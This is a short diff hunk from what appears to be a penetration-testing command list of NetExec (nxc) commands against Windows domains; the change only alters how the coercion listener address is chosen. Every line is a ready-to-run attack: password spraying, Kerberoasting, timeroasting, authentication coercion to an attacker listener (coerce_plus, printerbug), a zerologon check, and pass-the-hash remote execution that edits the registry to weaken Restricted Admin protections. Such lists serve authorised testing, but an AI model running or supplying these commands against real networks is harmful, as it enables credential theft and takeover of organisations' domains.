@@ -66,7 +66,7 @@ nxc smb "$IP" -u valid_users.txt -p "$PASSWORD" --continue-on-success
 nxc ldap "$IP" -u "$USER" -p "$PASSWORD" --kerberoasting kerb.txt
 nxc smb "$IP" -u "" -p "" -M timeroast
 nxc smb "$IP" -u "$USER" -p "$PASSWORD" --generate-krb5-file /etc/krb5.conf
-nxc smb "$DOMAIN" -u "$USER" -p "$PASSWORD" -M coerce_plus -o LISTENER="$LHOST"
+nxc smb "$DOMAIN" -u "$USER" -p "$PASSWORD" -M coerce_plus -o LISTENER="$(fzf-ip)"
 nxc smb "$DOMAIN" -u "$USER" -p "$PASSWORD" -M printerbug
 nxc smb "$IP" -M zerologon
 nxc smb "$IP" -u "$USER" -H "$NT_HASH" --local-auth -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
